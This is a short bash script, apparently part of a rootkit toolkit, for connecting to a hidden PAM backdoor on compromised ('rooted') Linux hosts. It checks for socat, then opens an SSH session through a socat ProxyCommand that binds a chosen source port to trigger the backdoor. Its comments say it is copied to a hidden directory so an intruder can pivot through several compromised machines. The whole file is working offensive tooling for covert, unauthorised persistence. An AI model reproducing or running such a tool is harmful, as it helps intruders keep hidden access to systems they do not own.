#!/bin/bash

# Small bash script designed to allow easy connection to hidden PAM backdoors.
# Gets copied to your hidden directory in case you want to route through more
# than one rooted box. :)

usage () { echo "$0 <PAM backdoor username> <host> <hidden PAM port>"; exit; }

[ -z $1 ] && { usage; }
[ -z $2 ] && { usage; }
[ -z $3 ] && { usage; }
[ ! -f /usr/bin/socat ] && { echo "socat isn't installed. exiting."; exit; }

echo "Connecting to PAM backdoor @ host $2 on hidden PAM port $3 as $1"
read -p "Press enter to continue"
ssh -o ProxyCommand="socat - tcp4-connect:$2:22,bind=:$3" $2 -l "$1"
